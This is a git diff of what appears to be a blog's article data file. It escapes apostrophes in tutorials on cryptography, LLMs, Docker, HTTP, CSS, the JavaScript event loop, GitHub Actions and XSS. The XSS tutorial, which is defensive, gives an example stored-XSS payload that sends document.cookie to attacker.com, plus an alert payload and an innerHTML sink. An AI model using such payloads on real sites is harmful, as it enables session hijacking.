+      <p>Remember the golden rule of social engineering defense: <strong>Trust, but verify.</strong> A polite "Let me call you back on your official number to confirm" or "I\'m going to verify this request with my manager first" is not an insult—it\'s the sign of a strong human firewall.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         A clever word, a friendly face,<br/>
         Can breach the walls of any place.
@@ -5250,7 +5250,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
     excerpt: 'From securing your online banking to protecting your messages on WhatsApp, cryptography is the invisible engine of our digital lives. This guide demystifies the core concepts of cryptography, explaining how it works and why it\'s essential for modern security.',
     content: `
       <h2>Introduction: The Science of Secret Writing</h2>
-      <p>Cryptography is the practice and study of techniques for secure communication in the presence of third parties called adversaries. It's about transforming readable information (plaintext) into an unreadable format (ciphertext) and back again, ensuring that only authorized parties can access it.</p>
+      <p>Cryptography is the practice and study of techniques for secure communication in the presence of third parties called adversaries. It\'s about transforming readable information (plaintext) into an unreadable format (ciphertext) and back again, ensuring that only authorized parties can access it.</p>
       <p>At its core, cryptography provides four essential security services:</p>
       <ul>
         <li><strong>Confidentiality:</strong> Ensures that information is accessible only to those authorized to have access.</li>
@@ -5268,7 +5268,7 @@ const user = await User.findOne({ where: { username: userInput } });</code></pre
       <p>A strong cryptographic system uses a well-known, publicly scrutinized algorithm combined with a secret key. The security of the system rests entirely on the secrecy and strength of the key.</p>
 
       <h3>Chapter 2: Symmetric Key Cryptography - The Single Key</h3>
-      <p>In symmetric cryptography, the same key is used for both encryption and decryption. This is like having a single key that can both lock and unlock a box. It's very fast and efficient, making it ideal for encrypting large amounts of data.</p>
+      <p>In symmetric cryptography, the same key is used for both encryption and decryption. This is like having a single key that can both lock and unlock a box. It\'s very fast and efficient, making it ideal for encrypting large amounts of data.</p>
       
       <h4>How it Works:</h4>
       <pre>Plaintext + Key -> [Encryption Algorithm] -> Ciphertext
@@ -5288,19 +5288,19 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       <p>Asymmetric cryptography, also known as public-key cryptography, solves the key distribution problem by using two different but mathematically related keys: a <strong>public key</strong> and a <strong>private key</strong>.</p>
       
       <ul>
-        <li><strong>Public Key:</strong> Can be shared freely with anyone. It's used to encrypt data.</li>
-        <li><strong>Private Key:</strong> Must be kept secret by the owner. It's used to decrypt data.</li>
+        <li><strong>Public Key:</strong> Can be shared freely with anyone. It\'s used to encrypt data.</li>
+        <li><strong>Private Key:</strong> Must be kept secret by the owner. It\'s used to decrypt data.</li>
       </ul>
 
       <h4>How it Works for Encryption:</h4>
       <ol>
         <li>Alice wants to send a secure message to Bob.</li>
         <li>Bob sends his public key to Alice.</li>
-        <li>Alice encrypts her message using Bob's public key.</li>
+        <li>Alice encrypts her message using Bob\'s public key.</li>
         <li>Alice sends the ciphertext to Bob.</li>
         <li>Bob decrypts the message using his private key.</li>
       </ol>
-      <p>Even if an attacker intercepts the message and has Bob's public key, they cannot decrypt the message without Bob's private key.</p>
+      <p>Even if an attacker intercepts the message and has Bob\'s public key, they cannot decrypt the message without Bob\'s private key.</p>
 
       <h4>Famous Asymmetric Algorithms:</h4>
       <ul>
@@ -5312,7 +5312,7 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       <p>A hash function is a one-way cryptographic algorithm that takes an input of any size and produces a fixed-size string of characters, which is called a hash value or digest. A good hash function has two key properties:</p>
       <ul>
         <li><strong>Deterministic:</strong> The same input will always produce the same output.</li>
-        <li><strong>Collision-Resistant:</strong> It's computationally infeasible to find two different inputs that produce the same hash value.</li>
+        <li><strong>Collision-Resistant:</strong> It\'s computationally infeasible to find two different inputs that produce the same hash value.</li>
       </ul>
       <p>Hashing is used for ensuring data integrity. If you hash a file and then send the file and its hash to someone, they can re-hash the file on their end. If the hashes match, they know the file has not been tampered with.</p>
 
@@ -5335,8 +5335,8 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
 
       <h4>How the Signature is Verified:</h4>
       <ol>
-        <li>Bob receives the message, signature, and Alice's public key.</li>
-        <li>He decrypts the signature using Alice's **public key** to get the original hash.</li>
+        <li>Bob receives the message, signature, and Alice\'s public key.</li>
+        <li>He decrypts the signature using Alice\'s **public key** to get the original hash.</li>
         <li>He creates a new hash of the message he received.</li>
         <li>He compares the two hashes. If they match, he knows:
           <ul>
@@ -5348,7 +5348,7 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       </ol>
 
       <h3>Conclusion: The Foundation of Modern Trust</h3>
-      <p>Cryptography is a complex and fascinating field, but its core concepts are the foundation of trust on the internet. Every time you see a padlock icon in your browser (indicating an HTTPS connection), you are using a hybrid system where asymmetric cryptography is used to securely exchange a symmetric key, which is then used to encrypt the rest of your session's data.</p>
+      <p>Cryptography is a complex and fascinating field, but its core concepts are the foundation of trust on the internet. Every time you see a padlock icon in your browser (indicating an HTTPS connection), you are using a hybrid system where asymmetric cryptography is used to securely exchange a symmetric key, which is then used to encrypt the rest of your session\'s data.</p>
       <p>Understanding these fundamentals is the first step toward appreciating the intricate dance of algorithms and keys that protect our digital world.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         With keys and codes, a secret kept,<br/>
@@ -5367,15 +5367,15 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
     excerpt: 'Large Language Models (LLMs) like GPT-4 are changing the world, but how do they actually work? This guide breaks down the complex technology behind LLMs into simple, understandable concepts, from tokens and embeddings to the magic of the Transformer architecture.',
     content: `
       <h2>Introduction: From Words to Intelligence</h2>
-      <p>Large Language Models (LLMs) are a type of artificial intelligence that can understand, generate, and manipulate human language. They power applications like ChatGPT, Google's Gemini, and AI-powered coding assistants. But how does a machine learn to "understand" language? It's a journey from simple words to complex mathematical representations.</p>
+      <p>Large Language Models (LLMs) are a type of artificial intelligence that can understand, generate, and manipulate human language. They power applications like ChatGPT, Google's Gemini, and AI-powered coding assistants. But how does a machine learn to "understand" language? It\'s a journey from simple words to complex mathematical representations.</p>
       <p>This guide will demystify the core components of an LLM without overwhelming you with complex math.</p>
 
       <h3>Chapter 1: The Raw Material - Data and Tokens</h3>
       <h4>The Training Data</h4>
-      <p>An LLM's "knowledge" comes from its training data. This is an unimaginably vast collection of text and code from the internet, including books, articles, websites like Wikipedia, and code repositories like GitHub. We're talking about trillions of words.</p>
+      <p>An LLM\'s "knowledge" comes from its training data. This is an unimaginably vast collection of text and code from the internet, including books, articles, websites like Wikipedia, and code repositories like GitHub. We\'re talking about trillions of words.</p>
       
       <h4>Tokenization: Breaking Down Language</h4>
-      <p>Computers don't understand words; they understand numbers. The first step in processing text is to break it down into smaller pieces called <strong>tokens</strong>. A token can be a word, a part of a word, or even just a single character or punctuation mark.</p>
+      <p>Computers don\'t understand words; they understand numbers. The first step in processing text is to break it down into smaller pieces called <strong>tokens</strong>. A token can be a word, a part of a word, or even just a single character or punctuation mark.</p>
       <p><strong>Example:</strong></p>
       <p>The sentence <code>"LLMs are powerful"</code> might be tokenized into:</p>
       <p><code>["LL", "Ms", " are", " powerful"]</code></p>
@@ -5384,7 +5384,7 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       <p>This process turns human language into a sequence of numbers that the model can process.</p>
 
       <h3>Chapter 2: Giving Words Meaning - Embeddings</h3>
-      <p>While tokens give us a numerical representation, they don't capture the *meaning* of words. The words "king" and "queen" are related, but their token IDs are just arbitrary numbers. This is where <strong>embeddings</strong> come in.</p>
+      <p>While tokens give us a numerical representation, they don\'t capture the *meaning* of words. The words "king" and "queen" are related, but their token IDs are just arbitrary numbers. This is where <strong>embeddings</strong> come in.</p>
       <p>An embedding is a list of floating-point numbers (a vector) that represents a token in a multi-dimensional space. Words with similar meanings are placed close to each other in this space.</p>
       
       <p><strong>Simplified Example:</strong></p>
@@ -5405,7 +5405,7 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       <p>The original Transformer had two parts:</p>
       <ul>
         <li><strong>The Encoder:</strong> Reads the input text and builds a sophisticated numerical representation (embedding) that captures the contextual meaning of each token.</li>
-        <li><strong>The Decoder:</strong> Takes the encoder's output and generates the output text, one token at a time.</li>
+        <li><strong>The Decoder:</strong> Takes the encoder\'s output and generates the output text, one token at a time.</li>
       </ul>
       <p>Modern LLMs like GPT are "decoder-only" models, meaning they are primarily focused on text generation.</p>
 
@@ -5413,19 +5413,19 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
       <p>At its heart, an LLM is a prediction machine. Its main training objective is incredibly simple: **predict the next word in a sentence.**</p>
       <p>The model is fed billions of sentences from its training data with one word masked out, and it has to guess the missing word.
       <p><strong>Example:</strong> <code>"The cat sat on the ____."</code>
-      <p>Initially, the model's predictions are random. But every time it makes a prediction, it compares its guess to the actual word ("mat"). It then calculates the error (the "loss") and adjusts its internal parameters (millions of them, called weights and biases) slightly to make a better prediction next time. This process, called <strong>backpropagation</strong>, is repeated trillions of times, allowing the model to gradually learn the patterns, grammar, syntax, and even the "facts" of language.</p>
+      <p>Initially, the model\'s predictions are random. But every time it makes a prediction, it compares its guess to the actual word ("mat"). It then calculates the error (the "loss") and adjusts its internal parameters (millions of them, called weights and biases) slightly to make a better prediction next time. This process, called <strong>backpropagation</strong>, is repeated trillions of times, allowing the model to gradually learn the patterns, grammar, syntax, and even the "facts" of language.</p>
 
       <h3>Chapter 5: Fine-Tuning - Aligning with Human Values</h3>
-      <p>After pre-training, the raw LLM is very knowledgeable but not very helpful. It might generate text that is factually incorrect, harmful, or just doesn't follow instructions well. The final step is to align the model with human intent. This is often done using a technique called <strong>Reinforcement Learning from Human Feedback (RLHF)</strong>.</p>
+      <p>After pre-training, the raw LLM is very knowledgeable but not very helpful. It might generate text that is factually incorrect, harmful, or just doesn\'t follow instructions well. The final step is to align the model with human intent. This is often done using a technique called <strong>Reinforcement Learning from Human Feedback (RLHF)</strong>.</p>
       <ol>
-        <li><strong>Collect Human Feedback:</strong> Human labelers are shown several of the model's responses to a prompt and are asked to rank them from best to worst.</li>
+        <li><strong>Collect Human Feedback:</strong> Human labelers are shown several of the model\'s responses to a prompt and are asked to rank them from best to worst.</li>
         <li><strong>Train a Reward Model:</strong> A separate "reward" model is trained on this data to learn what kind of responses humans prefer.</li>
         <li><strong>Fine-Tune the LLM:</strong> The original LLM is then fine-tuned using reinforcement learning, where it is "rewarded" for generating responses that the reward model predicts a human would like.</li>
       </ol>
       <p>This process is what makes models like ChatGPT helpful, harmless, and good at following instructions.</p>
 
       <h3>Conclusion: A Symphony of Probabilities</h3>
-      <p>It's important to remember that an LLM doesn't "think" or "understand" in the human sense. It is a highly sophisticated pattern-matching and prediction engine. When you ask it a question, it's not reasoning from first principles; it's calculating the most probable sequence of tokens that should come next, based on the patterns it learned from its vast training data.</p>
+      <p>It\'s important to remember that an LLM doesn\'t "think" or "understand" in the human sense. It is a highly sophisticated pattern-matching and prediction engine. When you ask it a question, it\'s not reasoning from first principles; it\'s calculating the most probable sequence of tokens that should come next, based on the patterns it learned from its vast training data.</p>
       <p>The journey from a simple word to an intelligent-seeming response is a multi-stage process of tokenization, embedding, and passing through the layers of a Transformer network, all fine-tuned by human feedback. The result is a tool of unprecedented power, built on a foundation of surprisingly simple mathematical principles scaled to an incredible size.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         In weights and vectors, patterns seen,<br/>
@@ -5444,7 +5444,7 @@ Ciphertext + Key -> [Decryption Algorithm] -> Plaintext</pre>
     excerpt: 'The age-old debate: Linux or Windows? For developers, the choice of an operating system is more than just a matter of preference; it can significantly impact productivity, workflow, and access to tools. This guide provides a detailed, practical comparison to help you choose the right OS for your development needs.',
     content: `
       <h2>Introduction: The Developer's Dilemma</h2>
-      <p>The choice between Linux and Windows has been a cornerstone of tech debates for decades. While both are powerful operating systems, they offer fundamentally different philosophies, toolchains, and development experiences. This guide will break down the comparison from a developer's point of view, focusing on what matters most: workflow, performance, and compatibility.</p>
+      <p>The choice between Linux and Windows has been a cornerstone of tech debates for decades. While both are powerful operating systems, they offer fundamentally different philosophies, toolchains, and development experiences. This guide will break down the comparison from a developer\'s point of view, focusing on what matters most: workflow, performance, and compatibility.</p>
 
       <h3>Chapter 1: The Core Philosophies</h3>
       <h4>Windows: The User-Friendly Behemoth</h4>
@@ -5558,13 +5558,13 @@ npm start</code></pre>
       <p>Docker is a platform for developing, shipping, and running applications in containers. A container packages up an application with all of its dependencies—libraries, system tools, code, and runtime—into a single, isolated unit.</p>
 
       <h3>Chapter 1: Containers vs. Virtual Machines (VMs)</h3>
-      <p>To understand Docker, it's helpful to compare it to traditional Virtual Machines.</p>
+      <p>To understand Docker, it\'s helpful to compare it to traditional Virtual Machines.</p>
       
       <h4>Virtual Machines (VMs)</h4>
       <p>A VM emulates a full computer system, including the hardware. Each VM has its own complete guest operating system (OS) running on top of the host OS. This is resource-intensive, as each VM requires its own OS kernel, memory, and CPU allocation.</p>
       
       <h4>Containers</h4>
-      <p>Containers, on the other hand, virtualize the operating system. They share the host system's OS kernel but run in isolated user spaces. This makes them incredibly lightweight, fast to start, and efficient.</p>
+      <p>Containers, on the other hand, virtualize the operating system. They share the host system\'s OS kernel but run in isolated user spaces. This makes them incredibly lightweight, fast to start, and efficient.</p>
 
       <table>
         <thead>
@@ -5601,7 +5601,7 @@ npm start</code></pre>
       <h3>Chapter 2: The Core Components of Docker</h3>
       
       <h4>The Dockerfile: The Blueprint</h4>
-      <p>A <code>Dockerfile</code> is a simple text file that contains instructions for building a Docker image. It's the recipe for your container.</p>
+      <p>A <code>Dockerfile</code> is a simple text file that contains instructions for building a Docker image. It\'s the recipe for your container.</p>
       <p><strong>Example Dockerfile for a simple Node.js app:</strong></p>
       <pre><code class="language-dockerfile"># Use an official Node.js runtime as a parent image
 FROM node:18-alpine
@@ -5638,7 +5638,7 @@ CMD [ "node", "server.js" ]</code></pre>
         <li><code>-p 4000:8080</code>: Maps port 4000 on the host to port 8080 in the container.</li>
         <li><code>-d</code>: Runs the container in detached mode (in the background).</li>
       </ul>
-      <p>You can now access your application at <code>http://localhost:4000</code>, no matter what OS you're on.</p>
+      <p>You can now access your application at <code>http://localhost:4000</code>, no matter what OS you\'re on.</p>
 
       <h3>Chapter 3: Practical Docker Commands Every Developer Should Know</h3>
       
@@ -5654,8 +5654,8 @@ CMD [ "node", "server.js" ]</code></pre>
       </ul>
 
       <h3>Chapter 4: Docker Compose - Managing Multi-Container Applications</h3>
-      <p>Most real-world applications don't consist of a single service. You might have a web server, a database, and a caching service. Managing these individually would be a pain. <strong>Docker Compose</strong> is a tool for defining and running multi-container Docker applications.</p>
-      <p>You use a YAML file (<code>docker-compose.yml</code>) to configure your application's services.</p>
+      <p>Most real-world applications don\'t consist of a single service. You might have a web server, a database, and a caching service. Managing these individually would be a pain. <strong>Docker Compose</strong> is a tool for defining and running multi-container Docker applications.</p>
+      <p>You use a YAML file (<code>docker-compose.yml</code>) to configure your application\'s services.</p>
       
       <p><strong>Example <code>docker-compose.yml</code>:</strong></p>
       <pre><code class="language-yaml">version: '3.8'
@@ -5783,7 +5783,7 @@ Accept: application/json
 Authorization: Bearer my-secret-token</code></pre>
 
       <h4>4. Body (Optional)</h4>
-      <p>The body contains the data being sent to the server, typically used with POST, PUT, and PATCH requests. It's often in JSON format.</p>
+      <p>The body contains the data being sent to the server, typically used with POST, PUT, and PATCH requests. It\'s often in JSON format.</p>
       <pre><code class="language-json">{
   "name": "John Doe",
   "email": "john.doe@example.com"
@@ -5840,7 +5840,7 @@ Cache-Control: public, max-age=3600</code></pre>
       <p>The payload of the response, often containing the requested resource in JSON format.</p>
 
       <h3>Chapter 3: REST - A Style for Building APIs</h3>
-      <p>REST is not a protocol or a standard; it's an architectural style for designing networked applications. An API that follows the principles of REST is called "RESTful".</p>
+      <p>REST is not a protocol or a standard; it\'s an architectural style for designing networked applications. An API that follows the principles of REST is called "RESTful".</p>
       
       <h4>The Six Constraints of REST</h4>
       <ol>
@@ -5902,7 +5902,7 @@ Cache-Control: public, max-age=3600</code></pre>
       <h3>Chapter 1: The Basics of CSS Custom Properties</h3>
       
       <h4>Declaration</h4>
-      <p>You declare a custom property using two dashes (<code>--</code>) followed by the property name, typically on the <code>:root</code> pseudo-class so it's available globally.</p>
+      <p>You declare a custom property using two dashes (<code>--</code>) followed by the property name, typically on the <code>:root</code> pseudo-class so it\'s available globally.</p>
       <pre><code class="language-css">:root {
   --primary-color: #3498db;
   --main-font-size: 16px;
@@ -5985,7 +5985,7 @@ themeToggleButton.addEventListener('click', () => {
     document.documentElement.setAttribute('data-theme', 'dark');
   }
 });</code></pre>
-      <p>There's no need to add/remove a class on the body and write dozens of CSS overrides. You just change the value of the custom properties, and the entire UI reacts.</p>
+      <p>There\'s no need to add/remove a class on the body and write dozens of CSS overrides. You just change the value of the custom properties, and the entire UI reacts.</p>
 
       <h3>Chapter 4: Practical Use Cases</h3>
       
@@ -6032,7 +6032,7 @@ h1 {
         <li><strong>More Dynamic:</strong> Easily change themes or styles with JavaScript.</li>
         <li><strong>More Readable:</strong> Give semantic names to cryptic values (e.g., <code>var(--color-brand-primary)</code> instead of <code>#5A3E8D</code>).</li>
       </ul>
-      <p>If you're not using them yet, start today. They are fully supported in all modern browsers and will fundamentally improve your CSS workflow.</p>
+      <p>If you\'re not using them yet, start today. They are fully supported in all modern browsers and will fundamentally improve your CSS workflow.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         In root they're born, through styles they flow,<br/>
         With var(), a theme begins to grow.
@@ -6063,7 +6063,7 @@ h1 {
       </ul>
 
       <h3>Chapter 2: The Process - A Step-by-Step Walkthrough</h3>
-      <p>Let's trace what happens with a simple piece of code:</p>
+      <p>Let\'s trace what happens with a simple piece of code:</p>
       <pre><code class="language-javascript">console.log('Start');
 
 setTimeout(() => {
@@ -6089,7 +6089,7 @@ console.log('End');</code></pre>
           <strong>Step 5:</strong> After 1 second, the timer in the Web API environment completes. It moves our callback function <code>() => { console.log('Timer finished'); }</code> into the Callback Queue.
         </li>
         <li>
-          <strong>Step 6:</strong> The Event Loop sees that the Call Stack is empty and there's a task waiting in the Callback Queue. It takes the first task from the queue (our callback) and pushes it onto the Call Stack.
+          <strong>Step 6:</strong> The Event Loop sees that the Call Stack is empty and there\'s a task waiting in the Callback Queue. It takes the first task from the queue (our callback) and pushes it onto the Call Stack.
         </li>
         <li>
           <strong>Step 7:</strong> The callback function executes. <code>console.log('Timer finished')</code> is called, prints "Timer finished" to the console, and is then popped off the stack.
@@ -6102,7 +6102,7 @@ Timer finished</code></pre>
       <p>This explains why <code>setTimeout(fn, 0)</code> doesn't run immediately. It still has to go through the whole loop, so it will always run *after* the current synchronous code has finished.</p>
 
       <h3>Chapter 3: Microtasks and Macrotasks - The Priority Lane</h3>
-      <p>The Callback Queue we discussed is more accurately called the **Macrotask Queue**. There's another, higher-priority queue called the **Microtask Queue**.</p>
+      <p>The Callback Queue we discussed is more accurately called the **Macrotask Queue**. There\'s another, higher-priority queue called the **Microtask Queue**.</p>
       
       <ul>
         <li><strong>Macrotasks:</strong> <code>setTimeout</code>, <code>setInterval</code>, DOM events, I/O operations.</li>
@@ -6111,7 +6111,7 @@ Timer finished</code></pre>
 
       <p>The Event Loop's rule is: <strong>after each macrotask, process the ENTIRE microtask queue before moving on to the next macrotask.</strong></p>
       
-      <p>Let's see it in action:</p>
+      <p>Let\'s see it in action:</p>
       <pre><code class="language-javascript">console.log('1: Start');
 
 setTimeout(() => console.log('2: Timeout'), 0);
@@ -6120,7 +6120,7 @@ Promise.resolve().then(() => console.log('3: Promise'));
 
 console.log('4: End');</code></pre>
       
-      <p>What's the output?</p>
+      <p>What\'s the output?</p>
       <ol>
         <li>'1: Start' and '4: End' are logged synchronously.</li>
         <li>The <code>setTimeout</code> callback is placed in the Macrotask Queue.</li>
@@ -6141,7 +6141,7 @@ console.log('4: End');</code></pre>
         <li><strong>Write Performant Code:</strong> Avoid blocking the main thread with long-running synchronous tasks, which leads to a frozen UI.</li>
         <li><strong>Master Advanced JavaScript:</strong> Fully grasp how Promises and async/await work under the hood.</li>
       </ul>
-      <p>The next time you write an async function or set a timer, visualize the journey of your code through the Call Stack, Web APIs, and the Queues. This mental model is one of the most powerful tools in a JavaScript developer's arsenal.</p>
+      <p>The next time you write an async function or set a timer, visualize the journey of your code through the Call Stack, Web APIs, and the Queues. This mental model is one of the most powerful tools in a JavaScript developer\'s arsenal.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         One single thread, a loop so fast,<br/>
         A non-blocking future, built to last.
@@ -6170,13 +6170,13 @@ console.log('4: End');</code></pre>
       <p><strong>Example Scenario:</strong></p>
       <ol>
         <li>An attacker posts a comment on a blog: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code>.</li>
-        <li>The blog's backend stores this comment in the database without cleaning it.</li>
-        <li>Every other user who views that blog post will have their browser execute the script, sending their session cookie to the attacker's server.</li>
-        <li>The attacker can now use this cookie to hijack the victim's session.</li>
+        <li>The blog\'s backend stores this comment in the database without cleaning it.</li>
+        <li>Every other user who views that blog post will have their browser execute the script, sending their session cookie to the attacker\'s server.</li>
+        <li>The attacker can now use this cookie to hijack the victim\'s session.</li>
       </ol>
 
       <h4>2. Reflected (or Non-Persistent) XSS</h4>
-      <p>In this attack, the malicious script is "reflected" off a web server. It's delivered to a victim through a different route, such as a link in an email or a malicious website. The injected code is included as part of the request sent to the server, and the server's response includes the script.</p>
+      <p>In this attack, the malicious script is "reflected" off a web server. It\'s delivered to a victim through a different route, such as a link in an email or a malicious website. The injected code is included as part of the request sent to the server, and the server\'s response includes the script.</p>
       <p><strong>Common Target:</strong> Search results pages.</p>
       <p><strong>Example Scenario:</strong></p>
       <ol>
@@ -6186,11 +6186,11 @@ console.log('4: End');</code></pre>
         <li>The attacker sends this link to a victim in a phishing email.</li>
         <li>The victim clicks the link. The browser sends the malicious script to the server as part of the URL.</li>
         <li>The server includes the script in the HTML response: "Showing results for: &lt;script&gt;alert('XSS');&lt;/script&gt;".</li>
-        <li>The victim's browser executes the script.</li>
+        <li>The victim\'s browser executes the script.</li>
       </ol>
 
       <h4>3. DOM-Based XSS</h4>
-      <p>This is a more advanced form of XSS where the entire attack happens on the client-side. The server is not involved. The script is injected by manipulating the Document Object Model (DOM) in the victim's browser, typically using a URL fragment (<code>#</code>).</p>
+      <p>This is a more advanced form of XSS where the entire attack happens on the client-side. The server is not involved. The script is injected by manipulating the Document Object Model (DOM) in the victim\'s browser, typically using a URL fragment (<code>#</code>).</p>
       <p><strong>Example Scenario:</strong></p>
       <p>A web page has client-side JavaScript that reads from the URL and writes it to the page:</p>
       <pre><code class="language-javascript">const username = window.location.hash.substring(1);
@@ -6232,8 +6232,8 @@ document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;</
       <h4>4. Set the <code>HttpOnly</code> Flag on Cookies</h4>
       <p>To mitigate the damage of an XSS attack, set the <code>HttpOnly</code> flag on your session cookies. This prevents JavaScript (including malicious scripts) from being able to access the cookie, making session hijacking much more difficult.</p>
 
-      <h3>Conclusion: A Developer's Responsibility</h3>
-      <p>XSS is a persistent threat, but it is preventable. As a developer, it's your responsibility to protect your users by sanitizing all data that your application displays.</p>
+      <h3>Conclusion: A Developer\'s Responsibility</h3>
+      <p>XSS is a persistent threat, but it is preventable. As a developer, it\'s your responsibility to protect your users by sanitizing all data that your application displays.</p>
       <p><strong>Your XSS Prevention Checklist:</strong></p>
       <ul>
         <li>✅ **Encode all user-supplied data** on output.</li>
@@ -6241,7 +6241,7 @@ document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;</
         <li>✅ Use a **modern frontend framework** that handles encoding automatically.</li>
         <li>✅ Set the **<code>HttpOnly</code> flag** on sensitive cookies.</li>
       </ul>
-      <p>By making these practices a standard part of your development workflow, you can build applications that are resilient to XSS and protect your users' trust and data.</p>
+      <p>By making these practices a standard part of your development workflow, you can build applications that are resilient to XSS and protect your users\' trust and data.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         Reflected, stored, or in the DOM,<br/>
         Encode the output, keep your users calm.
@@ -6261,7 +6261,7 @@ document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;</
       <h2>Introduction: Why Automate?</h2>
       <p>In modern software development, speed and reliability are everything. Manually testing, building, and deploying code is slow, error-prone, and inefficient. This is where CI/CD comes in.</p>
       <ul>
-        <li><strong>Continuous Integration (CI):</strong> The practice of frequently merging all developers' code changes into a central repository, after which automated builds and tests are run.</li>
+        <li><strong>Continuous Integration (CI):</strong> The practice of frequently merging all developers\' code changes into a central repository, after which automated builds and tests are run.</li>
         <li><strong>Continuous Deployment/Delivery (CD):</strong> The practice of automatically deploying all code changes that pass the CI stage to a testing or production environment.</li>
       </ul>
       <p><strong>GitHub Actions</strong> is a powerful and flexible CI/CD platform built directly into GitHub, making it incredibly easy to automate your workflows.</p>
@@ -6280,7 +6280,7 @@ document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;</
       </ul>
 
       <h3>Chapter 2: Building Your First CI Pipeline</h3>
-      <p>Let's create a simple CI workflow for a Node.js application that runs tests on every push to the <code>main</code> branch.</p>
+      <p>Let\'s create a simple CI workflow for a Node.js application that runs tests on every push to the <code>main</code> branch.</p>
       <p>Create a file named <code>.github/workflows/ci.yml</code>:</p>
       <pre><code class="language-yaml"># Name of your workflow
 name: Node.js CI
@@ -6331,13 +6331,13 @@ jobs:
         <li>It triggers on any push or pull request to the <code>main</code> branch.</li>
         <li>It defines a job named <code>build</code> that runs on an Ubuntu runner.</li>
         <li>It uses a "matrix strategy" to run the job three times, once for each specified Node.js version (16, 18, 20), ensuring compatibility.</li>
-        <li>The steps check out your code, install Node.js, install your project's dependencies (using <code>npm ci</code> for faster, more reliable installs), and finally run your tests.</li>
+        <li>The steps check out your code, install Node.js, install your project\'s dependencies (using <code>npm ci</code> for faster, more reliable installs), and finally run your tests.</li>
       </ol>
       <p>Once you commit this file, you can see the workflow run in the "Actions" tab of your GitHub repository.</p>
 
       <h3>Chapter 3: From CI to CD - Continuous Deployment</h3>
-      <p>Now that we have automated testing, let's automatically deploy our application to production when the tests pass.</p>
-      <p>We'll add a new job to our workflow that deploys to a service like Netlify or Vercel.</p>
+      <p>Now that we have automated testing, let\'s automatically deploy our application to production when the tests pass.</p>
+      <p>We\'ll add a new job to our workflow that deploys to a service like Netlify or Vercel.</p>
 
       <pre><code class="language-yaml"># ... (previous CI job)
 
@@ -6372,12 +6372,12 @@ jobs:
       <ul>
         <li><strong><code>needs: build</code>:</strong> This ensures the <code>deploy</code> job will only run if the <code>build</code> job completes successfully.</li>
         <li><strong><code>if: ...</code>:</strong> This conditional statement prevents the deployment from running on pull requests or pushes to other branches.</li>
-        <li><strong>Secrets:</strong> Sensitive information like API tokens (<code>NETLIFY_AUTH_TOKEN</code>) should never be hard-coded. You should store them in your repository's "Secrets" settings (Settings > Secrets and variables > Actions). GitHub Actions makes them available via the <code>secrets</code> context.</li>
+        <li><strong>Secrets:</strong> Sensitive information like API tokens (<code>NETLIFY_AUTH_TOKEN</code>) should never be hard-coded. You should store them in your repository\'s "Secrets" settings (Settings > Secrets and variables > Actions). GitHub Actions makes them available via the <code>secrets</code> context.</li>
       </ul>
 
       <h3>Chapter 4: Best Practices for GitHub Actions</h3>
       <ul>
-        <li><strong>Use Community Actions:</strong> Don't reinvent the wheel. The GitHub Marketplace has thousands of reusable actions for common tasks.</li>
+        <li><strong>Use Community Actions:</strong> Don\'t reinvent the wheel. The GitHub Marketplace has thousands of reusable actions for common tasks.</li>
         <li><strong>Cache Dependencies:</strong> Use actions like <code>actions/setup-node</code> with caching enabled to speed up your builds by not re-downloading dependencies every time.</li>
         <li><strong>Keep Jobs Small and Focused:</strong> Each job should have a single responsibility (e.g., test, lint, deploy).</li>
         <li><strong>Use Environments for Security:</strong> For production deployments, use GitHub Environments to add protection rules, such as requiring approval from a specific team member before a deployment can proceed.</li>
@@ -6462,7 +6462,7 @@ npm install replicate dotenv</code></pre>
       <pre><code class="language-bash">REPLICATE_API_TOKEN="your_api_token_here"</code></pre>
 
       <h3>Chapter 3: Your First Image Generation with Code</h3>
-      <p>Let's write a script to generate an image. Create a file named <code>generate.js</code>.</p>
+      <p>Let\'s write a script to generate an image. Create a file named <code>generate.js</code>.</p>
       <pre><code class="language-javascript">require('dotenv').config();
 const Replicate = require('replicate');
 
@@ -6493,7 +6493,7 @@ generateImage();</code></pre>
 
       <h4>Running the Script</h4>
       <pre><code class="language-bash">node generate.js</code></pre>
-      <p>After a few seconds, you'll get a URL in your console pointing to your generated image. You've just created an AI image with code!</p>
+      <p>After a few seconds, you\'ll get a URL in your console pointing to your generated image. You\'ve just created an AI image with code!</p>
 
       <h3>Chapter 4: Key Parameters for Image Generation</h3>
       <p>The quality and style of your image depend heavily on the parameters you provide.</p>
@@ -6524,7 +6524,7 @@ const output = await replicate.run("stability-ai/stable-diffusion-3-medium-img2i
       <h4>Using Custom Models with LoRAs</h4>
       <p>LoRAs (Low-Rank Adaptations) are small files that can be used to fine-tune a model on a specific style, character, or object. The Replicate API allows you to use community-trained LoRAs to achieve highly specific aesthetics.</p>
 
-      <h3>Conclusion: The Developer's Creative Canvas</h3>
+      <h3>Conclusion: The Developer\'s Creative Canvas</h3>
       <p>Programmatic AI image generation opens up endless possibilities:</p>
       <ul>
         <li><strong>Automated Content Creation:</strong> Generate unique blog post headers or social media images automatically.</li>
@@ -6532,7 +6532,7 @@ const output = await replicate.run("stability-ai/stable-diffusion-3-medium-img2i
         <li><strong>Dynamic Game Assets:</strong> Generate unique textures or character concepts on the fly.</li>
